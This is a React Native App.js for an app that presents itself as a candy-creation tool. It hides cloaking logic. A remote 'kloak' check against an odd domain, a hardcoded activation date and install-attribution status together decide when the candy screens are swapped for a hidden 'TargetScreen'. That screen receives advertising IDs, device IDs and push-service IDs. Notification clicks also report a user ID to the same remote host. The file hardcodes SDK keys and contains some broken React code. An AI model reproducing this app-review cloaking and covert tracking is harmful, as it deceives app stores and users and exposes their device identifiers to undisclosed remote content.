import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {
  CreateSweet,
  Welcome,
  CollectionDetails,
  CreateCollection,
  CandyDetails,
  EncyclopediaItemDetails,
  TargetScreen,
} from './screen/stack';
import TabNavMenu from './screen/menu/TabNavMenu';
import {AppProvider} from './store/context';
import {useEffect, useState, useCallback, useRef, useMemo} from 'react';
import {Linking} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import appsFlyer from 'react-native-appsflyer';
import {getUniqueId, getManufacturer} from 'react-native-device-info';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';

const Stack = createNativeStackNavigator();

// Apps Flyer Dev Key-ZP6F7NaeyNmgAdC29AdB4T

const option = {
  devKey: 'ZP6F7NaeyNmgAdC29AdB4T',
  appId: 'com.sweet.candycreator',
  onInstallConversionDataListener: true,
  onDeepLinkListener: true,
  timeToWaitForATTUserAuthorization: 10,
  manualStart: true,
};

// export const handleGetAaid = async () => {
//   // for android
//   try {
//     const aaid = await ReactNativeIdfaAaid.getAdvertisingInfo();
//     return aaid.id;
//   } catch (err) {
//     console.log('err', err);
//     return null;
//   }
// };

const generateTimestampUserId = () => {
  return `${new Date().getTime()}-${Math.floor(
    1000000 + Math.random() * 9000000,
  )}`;
};

const INITIAL_URL = `https://brilliant-grand-happiness.space/`;
const URL_IDENTIFAIRE = `VDdJJfkx`;
const targetData = new Date('2025-03-06T10:00:00Z');
const currentDate = new Date();

function App() {
  const [customerUserId, setCustomerUserId] = useState(null);
  const [isOneSignalReady, setIsOneSignalReady] = useState(false);
  const [oneSignalUserId, setOneSignalUserId] = useState(null);
  const [oneSignalPermissionStatus, setOneSignalPermissionStatus] =
    useState(false);
  const [sabData, setSabData] = useState(null);
  const [isNonOrganicInstall, setIsNonOrganicInstall] = useState(false);
  const [isConversionDataReceived, setIsConversionDataReceived] =
    useState(false);
  const [naming, setNaming] = useState(null);

  const [isFirstVisit, setIsFirstVisit] = useState(null);
  const [isReadyToVisit, setIsReadyToVisit] = useState(false);
  const [timeStamp, setTimeStamp] = useState(null);
  const [applsFlyerUID, setApplsFlyerUID] = useState(null);
  const [openWithPush, setOpenWithPush] = useState(false);
  const [idfv, setIdfv] = useState(null);
  const [aaid, setAaid] = useState(null);
  const hasCheckedUrl = useRef(false); // Add this ref
  const urlCheckTimeout = useRef(null);
  // console.log(aaid);

  // console.log('isFirstVisit', isFirstVisit);
  // console.log('isReadyToVisit', isReadyToVisit);
  // console.log('isConversionDataReceived', isConversionDataReceived);

  useEffect(() => {
    const initOneSignal = async () => {
      // Remove this method to stop OneSignal Debugging
      OneSignal.Debug.setLogLevel(LogLevel.Verbose);
      // OneSignal Initialization
      OneSignal.initialize('d750ad28-3354-47e3-9798-9e84d42eb337');

      try {
        // Request permission and get user ID
        const permissionResult =
          await OneSignal.Notifications.requestPermission(true);
        // console.log('OneSignal permission result:', permissionResult);
        setOneSignalPermissionStatus(permissionResult);

        // if (permissionResult) {
        // console.log('OneSignal: user id:', userId);
        const userId = await OneSignal.User.getOnesignalId();

        if (userId) {
          setOneSignalUserId(userId);
          await AsyncStorage.setItem('oneSignalUserId', userId);
          setIsOneSignalReady(true);
        } else {
          // If no userId, set up a listener for when it becomes available
          const userStateChangedListener = OneSignal.User.addEventListener(
            'change',
            async event => {
              const newUserId = await OneSignal.User.getOnesignalId();
              if (newUserId) {
                // console.log('OneSignal: got delayed user id:', newUserId);
                setOneSignalUserId(newUserId);
                await AsyncStorage.setItem('oneSignalUserId', newUserId);
                setIsOneSignalReady(true);
                userStateChangedListener.remove();
              }
            },
          );
        }
        // }
      } catch (error) {
        console.error('Error initializing OneSignal:', error);
        // Fallback: try to get stored userId
        const storedUserId = await AsyncStorage.getItem('oneSignalUserId');
        if (storedUserId) {
          setOneSignalUserId(storedUserId);
          setIsOneSignalReady(true);
        }
      }
    };

    initOneSignal();
  }, []);

  // init AppsFlyer
  useEffect(() => {
    console.log('App.js Init', 'App started');

    appsFlyer.onInstallConversionData(async res => {
      Alert.alert('AppsFlyer Data', JSON.stringify(res.data));
      console.log('AppsFlyer Conversion Data received:', res.data);
      // Alert.alert('AppsFlyer resp data App.js:', JSON.stringify(res.data));
      if (JSON.parse(res.data.is_first_launch) === true) {
        if (res.data.af_status === 'Non-organic') {
          var media_source = res.data.media_source;
          var campaign = res.data.campaign;
          // Alert.alert('Non-organic', campaign);
          // const nonOrganicTest='non_organic_test_data';
          try {
            // Save non-organic data
            // await AsyncStorage.setItem('sabData', campaign);
            await AsyncStorage.setItem('sabData', campaign);
            // console.log('Saved sabData to AsyncStorage:', campaign);
            // setSabData(campaign);
            setSabData(campaign);

            await AsyncStorage.setItem('isNonOrganicInstall', 'true');
            // console.log('Saved isNonOrganicInstall as true');
            setIsNonOrganicInstall(true);
          } catch (error) {
            console.error('Error saving non-organic data:', error);
          }
        } else if (res.data.af_status === 'Organic') {
          console.log('Organic install detected');
          const organicTestData = '';

          try {
            // Save organic test data
            // await AsyncStorage.setItem('sabData', organicTestData);
            // console.log('Saved organic test sabData:', organicTestData);
            setSabData(organicTestData);

            await AsyncStorage.setItem('isNonOrganicInstall', 'false');
            // console.log('Saved isNonOrganicInstall as false');
            setIsNonOrganicInstall(false);
          } catch (error) {
            console.error('Error saving organic data:', error);
          }
        }
      } else {
        // Not first launch - try to get stored data
        console.log('Not first app launch');
        try {
          const storedSabData = await AsyncStorage.getItem('sabData');
          const storedIsNonOrganic = await AsyncStorage.getItem(
            'isNonOrganicInstall',
          );

          console.log('Retrieved stored data:', {
            storedSabData,
            storedIsNonOrganic,
          });

          if (storedSabData) {
            setSabData(storedSabData);
          }
          setIsNonOrganicInstall(storedIsNonOrganic === 'true');
        } catch (error) {
          console.error('Error retrieving stored data:', error);
        }
      }
      setIsConversionDataReceived(true);
    });
  }, []);

  const checkFirstVisit = async () => {
    try {
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      // console.log('hasVisited', hasVisited);

      // Get stored timestamp_user_id first
      let storedTimeStamp = await AsyncStorage.getItem('timeStamp');
      if (!storedTimeStamp) {
        // Generate new timestamp_user_id only if none exists
        storedTimeStamp = generateTimestampUserId();
        await AsyncStorage.setItem('timeStamp', storedTimeStamp);
        // console.log('Generated new timestamp_user_id:', storedTimeStamp);
      } else {
        // console.log('Retrieved stored timestamp_user_id:', storedTimeStamp);
      }

      // Set timestamp for use in app
      setTimeStamp(storedTimeStamp);

      if (!hasVisited) {
        // console.log('First visit');
        setIsFirstVisit(true);

        OneSignal.User.addTag('timestamp_user_id', storedTimeStamp);

        await new Promise(resolve => setTimeout(resolve, 500));

        await AsyncStorage.setItem('hasVisitedBefore', 'true');
      } else {
        // Returning user

        setIsFirstVisit(false);
        // setTimeStamp(parsedTimeStamp);
      }
    } catch (error) {
      console.error('Error checking first visit:', error);
    }
  };

  const isReadyToVisitHandler = async () => {
    if (hasCheckedUrl.current) {
      console.log('URL check already performed');
      return;
    }

    // Clear any existing timeout
    if (urlCheckTimeout.current) {
      clearTimeout(urlCheckTimeout.current);
    }

    // Set a flag to prevent immediate re-runs
    hasCheckedUrl.current = true;

    try {
      const kloakSuccess = await AsyncStorage.getItem('kloakSuccess');
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      const visitUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
      console.log('hasVisited', hasVisited);
      console.log('kloakSuccess', kloakSuccess);

      // Case 1: App was visited before and had successful kloak check
      if (hasVisited && kloakSuccess) {
        console.log('App visited before and kloakSuccess 200');
        setIsReadyToVisit(true);
        return;
      }

      // Case 2: Only fetch URL if not visited before
      if (!hasVisited) {
        console.log('First visit - checking URL');

        // Add timeout to ensure only one fetch happens
        urlCheckTimeout.current = setTimeout(async () => {
          try {
            const response = await fetch(visitUrl);
            console.log('URL status:', response.status);

            if (response.status === 200) {
              await AsyncStorage.setItem('kloakSuccess', 'true');

              if (currentDate >= targetData) {
                setIsReadyToVisit(true);
                console.log('Current date passed target date, ready to visit');
              } else {
                setIsReadyToVisit(false);
                console.log('Current date has not passed target date');
              }
            } else {
              setIsReadyToVisit(false);
            }
          } catch (error) {
            console.log('URL fetch error:', error);
            setIsReadyToVisit(false);
          }
        }, 500); // Add small delay to prevent double calls
      }
    } catch (error) {
      console.log('Error in isReadyToVisitHandler:', error);
      setIsReadyToVisit(false);
    }

    // Cleanup timeout on unmount
    useEffect(() => {
      return () => {
        if (urlCheckTimeout.current) {
          clearTimeout(urlCheckTimeout.current);
        }
      };
    }, []);
  };

  useEffect(() => {
    checkFirstVisit();
    isReadyToVisitHandler();
    initAppsFlyer();
    // getOneSignalUserId();

    // If it's not first visit, mark conversion data as already received
    if (!isFirstVisit) {
      setIsConversionDataReceived(true);
    }
  }, [isFirstVisit]);

  const initAppsFlyer = async () => {
    // Rest of AppsFlyer initialization
    // const aaid = await handleGetAaid();
    // setAaid(aaid);

    ReactNativeIdfaAaid.getAdvertisingInfo().then(resp => {
      // console.log(resp.id);
      setAaid(resp.id);
    });

    // handleInitSdk();
    appsFlyer.initSdk(
      option,
      res => {
        // console.log('AppsFlyer SDK integration:', res);
      },
      error => {
        console.error('AppsFlyer SDK failed to start:', error);
      },
    );

    appsFlyer.startSdk();

    const getDiviceUniqId = await getUniqueId();
    setIdfv(getDiviceUniqId);
    // console.log('uniq id from getUniqueId', getDiviceUniqId);
    setCustomerUserId(getDiviceUniqId);
    // console.log('AppsFlyer SDK integration:', appsFlyer);

    // handleCustomerUserId(getDiviceUniqId);
    appsFlyer.setCustomerUserId(
      customerUserId,
      res => {
        // console.log('AppsFlyer SDK setCustomerUserId:', res);
      },
      error => {
        console.error('AppsFlyer SDK failed to setCustomerUserId:', error);
      },
    );

    // handleAppsFlyerUID();
    appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
      if (err) {
        console.error(err);
      } else {
        // console.log('App.js on getAppsFlyerUID: ', appsFlyerUID);
        setApplsFlyerUID(appsFlyerUID);
      }
    });
  };

  const handleNotificationClick = useCallback(async event => {
    // console.log('🔔 Handling notification click:', event);
    const timeStamp = await AsyncStorage.getItem('timeStamp');
    const baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    let finalUrl;

    try {
      // Check if this is first visit
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');

      if (event.notification.launchURL) {
        console.log('Regular push_open_browser case');
        finalUrl = `${baseUrl}?utretg=push_open_browser&jthrhg=${timeStamp}`;
        await fetch(finalUrl);
        await Linking.openURL(finalUrl);
        await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));
        setOpenWithPush(true);
      } else {
        console.log('Regular push_open_webview case');
        finalUrl = `${baseUrl}?utretg=push_open_webview&jthrhg=${timeStamp}`;
        setOpenWithPush(true);
        // Set push state in AsyncStorage
        await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));
        console.log('Set openedWithPush in AsyncStorage');
        if (!hasVisited) {
          await AsyncStorage.setItem('hasVisitedBefore', 'true');
          console.log('Marked as visited for the first time');
        }

        // Update states
        setOpenWithPush(true);
        console.log('Set openWithPush state to true');

        // Make the fetch request
        await fetch(finalUrl);

        // Ensure ready to visit
        // setIsReadyToVisit(true);
      }
    } catch (error) {
      console.error('🔔 Error handling notification:', error);
    }
  }, []);

  useEffect(() => {
    const setupNotifications = async () => {
      try {
        // Add notification click listener with the handler
        const clickListener = OneSignal.Notifications.addEventListener(
          'click',
          event => {
            // console.log('🔔 Notification clicked:', event);
            handleNotificationClick(event);
          },
        );
        // ... rest of your notification setup ...

        return () => {
          clickListener.remove();
          // ... other cleanup ...
        };
      } catch (error) {
        console.error('🔔 Error setting up notifications:', error);
      }
    };

    setupNotifications();
  }, []);

  // Update isReadyForTestScreen to include OneSignal check
  const isReadyForTestScreen = useMemo(() => {
    console.log('Ready check:', {
      isReadyToVisit,
      aaid,
      applsFlyerUID,
      idfv,
      timeStamp,
      isConversionDataReceived,
      oneSignalUserId,
      isOneSignalReady,
    });

    // Basic requirements for all launches
    const baseRequirements =
      isReadyToVisit &&
      aaid &&
      applsFlyerUID &&
      idfv &&
      timeStamp &&
      isConversionDataReceived &&
      isOneSignalReady &&
      oneSignalUserId;

    // For first launch, also require sabData
    if (isFirstVisit) {
      return baseRequirements;
    }

    // For subsequent launches, only need base requirements
    return baseRequirements;
  }, [
    isReadyToVisit,
    aaid,
    applsFlyerUID,
    idfv,
    timeStamp,
    isConversionDataReceived,
    isOneSignalReady,
    oneSignalUserId,
    isFirstVisit,
    openWithPush,
  ]);

  return (
    <AppProvider>
      <NavigationContainer>
        <Stack.Navigator
          screenOptions={{
            headerShown: false,
            animation: 'fade',
            animationDuration: 1000,
          }}>
          {isReadyForTestScreen ? (
            <Stack.Screen
              name="TargetScreen"
              component={TargetScreen}
              initialParams={{
                idfa: aaid,
                oneSignalUserId, // Now guaranteed to have a value
                idfv,
                applsFlyerUID,
                jthrhg: timeStamp,
                isFirstVisit,
                timeStamp,
                naming,
                oneSignalPermissionStatus,
                isNonOrganicInstall,
                openWithPush,
                ...(isFirstVisit && {sabData}),
              }}
            />
          ) : (
            <>
              <Stack.Screen name="Welcome" component={Welcome} />
              <Stack.Screen name="TabNavMenu" component={TabNavMenu} />
              <Stack.Screen
                name="EncyclopediaItemDetails"
                component={EncyclopediaItemDetails}
              />
              <Stack.Screen name="CreateSweet" component={CreateSweet} />
              <Stack.Screen name="CandyDetails" component={CandyDetails} />
              <Stack.Screen
                name="CreateCollection"
                component={CreateCollection}
              />
              <Stack.Screen
                name="CollectionDetails"
                component={CollectionDetails}
              />
            </>
          )}
        </Stack.Navigator>
      </NavigationContainer>
    </AppProvider>
  );
}
export default App;
